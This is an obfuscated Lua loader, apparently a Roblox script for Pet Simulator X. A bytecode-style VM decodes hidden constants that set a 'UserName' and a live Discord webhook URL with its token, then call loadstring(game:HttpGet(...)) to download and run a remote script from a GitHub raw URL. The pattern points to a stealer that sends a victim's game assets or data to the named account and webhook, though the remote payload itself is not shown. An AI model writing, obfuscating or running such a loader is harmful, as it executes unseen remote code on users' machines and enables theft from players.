
 do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v75=v2(v0(v30,16));if v19 then local v87=v5(v75,v19);v19=nil;return v87;else return v75;end end end);local function v20(v31,v32,v33)if v33 then local v76=(v31/((4 -2)^(v32-(3 -(2 -0)))))%((1 + (1047 -(478 + 568)))^(((v33-(1066 -(693 + 372))) -(v32-(1 + 0))) + 1));return v76-(v76%(1 + 0 + 0));else local v77=(1243 -(767 + 474))^(v32-((1841 -(899 + 750)) -(11 + 168 + 12)));return (((v31%(v77 + v77))>=v77) and (51 -(40 + 10))) or (0 -0);end end local function v21()local v38=v1(v16,v18,v18);v18=v18 + 1;return v38;end local function v22()local v39,v40=v1(v16,v18,v18 + 2 + 0);v18=v18 + 2 + 0;return (v40 * 256) + v39;end local function v23()local v41,v42,v43,v44=v1(v16,v18,v18 + (1168 -(57 + 1108)));v18=v18 + (1621 -(550 + 1067));return (v44 * ((3411019 -(45 + 26)) + 13366268)) + (v43 * (103261 -37725)) + (v42 * (618 -(167 + 195))) + v41;end local function v24()local v45=v23();local v46=v23();local v47=1;local v48=(v20(v46,1 + 0,71 -(127 -76)) * ((1 + 1)^(85 -53))) + v45;local v49=v20(v46,21,16 + 15);local v50=((v20(v46,51 -19)==(1 + 0)) and  -(850 -(793 + 56))) or (1 -0);if (v49==(0 -0)) then if (v48==(0 + 0)) then return v50 * (0 -(0 -0));else v49=1361 -(1228 + 132);v47=0;end elseif (v49==(101 + 1946)) then return ((v48==((1687 -(174 + 1118)) -(46 + 141 + 208))) and (v50 * ((2 -1)/(0 + 0)))) or (v50 * NaN);end return v8(v50,v49-(2942 -(171 + 1748))) * (v47 + (v48/((2 -0)^(133 -81))));end local function v25(v34)local v51;if  not v34 then v34=v23();if (v34==(0 -0)) then return "";end end v51=v3(v16,v18,(v18 + v34) -(1 + 0));v18=v18 + v34;local v52={};for v63=1 + 0, #v51 do v52[v63]=v2(v1(v3(v51,v63,v63)));end return v6(v52);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v53={};local v54={};local v55={};local v56={v53,v54,nil,v55};local v57=v23();local v58={};for v65=1,v57 do local v66=v21();local v67;if (v66==(1 + 0)) then v67=v21()~=(0 + 0);elseif (v66==(5 -3)) then v67=v24();elseif (v66==(3 + 0)) then v67=v25();end v58[v65]=v67;end v56[3]=v21();for v69=1 + 0,v23() do local v70=v21();if (v20(v70,1,1 + 0)==(0 + 0)) then local v83=v20(v70,2,3);local v84=v20(v70,4,19 -13);local v85={v22(),v22(),nil,nil};if (v83==0) then v85[2 + 1]=v22();v85[4]=v22();elseif (v83==1) then v85[3]=v23();elseif (v83==2) then v85[3]=v23() -((1 + 1)^16);elseif (v83==(11 -8)) then v85[1570 -(753 + 814)]=v23() -(2^16);v85[4]=v22();end if (v20(v84,1595 -(620 + 974),1)~=1) then else v85[2]=v58[v85[1 + 1]];end if (v20(v84,2,7 -5)==1) then v85[3]=v58[v85[7 -4]];end if (v20(v84,3,356 -(124 + 229))~=(368 -(338 + 29))) then else v85[4]=v58[v85[7 -3]];end v53[v69]=v85;end end for v71=1,v23() do v54[v71-(1 + 0)]=v28();end for v73=879 -(573 + 305),v23() do v55[v73]=v23();end return v56;end local function v29(v35,v36,v37)local v60=v35[1];local v61=v35[2];local v62=v35[3];return function(...)local v78=1;local v79= -1;local v80={...};local v81=v12("#",...) -1;local function v82()local v88=v60;local v89=v61;local v90=v62;local v91=v27;local v92={};local v93={};local v94={};for v107=1300 -((1664 -802) + 438),v81 do if (((1259 + 1037)>=(390 + 795)) and (v107>=v90)) then v92[v107-v90]=v80[v107 + (1519 -(1185 + 333))];else v94[v107]=v80[v107 + ((1221 -(508 + 712)) -0)];end end local v95=(v81-v90) + (2 -1);local v96;local v97;while true do v96=v88[v78];v97=v96[1 + 0];if ((v97<=(3 + 0)) or ((4489 + 140)<=(13748 -9841))) then if ((v97<=((955 + 900) -(1729 + 125))) or ((9756 -5814)>(9352 -4752))) then if ((((12472 -(902 + 128)) -7409)>=(4766 -(342 + 1164))) and (v97>(1745 -(1356 + 389)))) then v37[v96[3 + 0]]=v94[v96[1 + 1]];else local v120=v96[2 + 0];local v121,v122=v91(v94[v120](v13(v94,v120 + (1 -(575 -(534 + 41))),v96[(6 + 0) -3])));v79=(v122 + v120) -(1 + 0);local v123=0 -0;for v129=v120,v79 do v123=v123 + 1;v94[v129]=v121[v123];end end elseif ((2370==(2223 + 147)) and (v97==2)) then do return;end else v94[v96[2]]=v37[v96[811 -(209 + 599)]];end elseif ((2337<=((7861 -5956) + 1032)) and (v97<=5)) then if (((1200 + 995)<((1647 + 3391) -((3756 -2333) + 354))) and (v97>(1 + 3))) then local v126=v96[4 -2];v94[v126]=v94[v126](v13(v94,v126 + 1,v79));else v94[v96[2]]=v96[1 + 2]~=(0 + 0);end elseif (((1939 -(6 + 308))<=(2046 + 833)) and (v97<=(15 -(12 -3)))) then v94[v96[1 + 1]]();elseif (((1691 -(326 + 359 + 71))>=(352 -(33 + 176))) and (v97>((70 -52) -11))) then local v132=v96[1 + 1];local v133=v94[v96[2 + 1]];v94[v132 + (2 -1)]=v133;v94[v132]=v133[v96[1245 -(904 + 337)]];else v94[v96[1872 -(1128 + 742)]]=v96[3];end v78=v78 + 1 + 0;end end A,B=v27(v11(v82));if  not A[1] then local v98=v35[4][v78] or "?";error("Script error at ["   .. v98   .. "]:"   .. A[2]);else return v13(A,2,B);end end;end return v29(v28(),{},v17)(...);end v15("LOL!083O0003083O00557365724E616D65030E3O006765736C6570656E706F6564657203073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313036333834333630323539353332332O39352F45785958706C73535258727A5F38754C4D4E6D715544735575344F4D314F735670364A2O686E5935745A316A7855385841366D43387673796E6C4232534C3977667A574D030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574033D3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4861726447616D6553732F5053582F6D61696E2F4E65772E6C7561000D3O0012073O00023O0012013O00013O0012073O00043O0012013O00033O0012033O00053O001203000100063O002008000100010007001207000300084O0004000400016O000100044O00055O00022O00063O000100012O00023O00017O000D3O00023O00023O00033O00033O00043O00043O00043O00043O00043O00043O00043O00043O00053O00",v9(),...);end
